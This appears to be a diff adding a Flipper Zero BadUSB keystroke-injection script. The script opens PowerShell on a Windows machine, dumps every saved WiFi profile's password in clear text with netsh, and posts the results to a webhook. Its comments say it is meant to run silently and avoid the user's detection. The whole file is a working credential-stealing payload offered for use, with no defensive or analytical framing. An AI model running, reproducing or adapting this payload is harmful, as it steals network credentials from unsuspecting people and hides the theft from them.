@@ -1,0 +1,15 @@
+REM BadUSB Script for Flipper Zero to Extract WiFi Passwords and Send to Webhook
+REM Ensure script runs silently and avoids user detection
+
+
+DEFAULTDELAY 100
+DEFAULTSTRINGDELAY 1
+
+GUI r
+DELAY 500
+STRINGLN powershell
+DELAY 500
+
+STRINGLN $wifiDetails=(netsh wlan show profiles)-match'All'|%{$n=($_-split': ')[1].Trim();"`n$n";(netsh wlan show profile "$n" key=clear)-match'Key Content'|%{($_-split': ')[1].Trim()}};$webhookUrl='#';$data=@{'content'="`n$($wifiDetails -join "`n")";'username'='a'}|ConvertTo-Json;Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $data
+
+STRINGLN exit
